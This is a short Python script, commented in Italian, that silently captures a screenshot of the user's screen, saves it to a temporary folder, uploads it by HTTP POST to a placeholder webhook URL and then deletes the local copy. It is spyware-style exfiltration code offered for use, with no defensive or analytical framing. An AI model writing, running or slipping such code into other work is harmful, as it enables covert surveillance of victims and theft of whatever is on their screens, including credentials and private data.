import os
import requests
from PIL import ImageGrab

# Ottieni il percorso della directory home dell'utente
user = os.path.expanduser("~")

# Inserisci il tuo URL di destinazione
hook = "URL_DEL_TUO_DESTINATARIO"

# Effettua la cattura dello schermo
captura = ImageGrab.grab()

# Salva l'immagine in una posizione temporanea
if os.name == 'nt':  # Controllo se il sistema operativo è Windows
    save_path = os.path.join(user, "AppData", "Local", "Temp", "ss.png")
else:  # Altrimenti, è probabile che sia Linux
    save_path = os.path.join(user, "ss.png")

captura.save(save_path)

# Crea un dizionario contenente il file da inviare
file = {"file": open(save_path, "rb")}

# Effettua una richiesta POST con il file
r = requests.post(hook, files=file)

# Prova a rimuovere il file temporaneo dopo l'invio
try:
    os.remove(save_path)
except Exception as e:
    print(f"Errore durante la rimozione del file: {e}")
